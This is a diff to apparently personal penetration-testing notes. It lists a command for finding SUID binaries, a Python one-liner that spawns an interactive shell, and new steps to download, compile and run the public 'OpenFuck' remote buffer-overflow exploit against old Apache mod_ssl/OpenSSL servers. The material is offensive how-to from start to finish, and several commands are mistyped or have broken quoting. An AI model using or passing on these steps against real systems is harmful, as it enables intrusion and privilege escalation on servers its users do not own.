@@ -2,3 +2,13 @@ find su permetion
 find / -perm -u=s -type f >/dev/null
 =================================
 python-c  "import pty;pty.spawn("/bin/sh")
+
+==============================================
+
+Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow
+0-download 764.c from  ====>  https://github.com/haco1971/codes/blob/master/764.c
+1=apt-get install libssl-dev
+2-apt-get install libssl1.0-dev
+3-gcc -o OpenFuck 764.c -lcrypto
+4-./OpenFuck
+5-
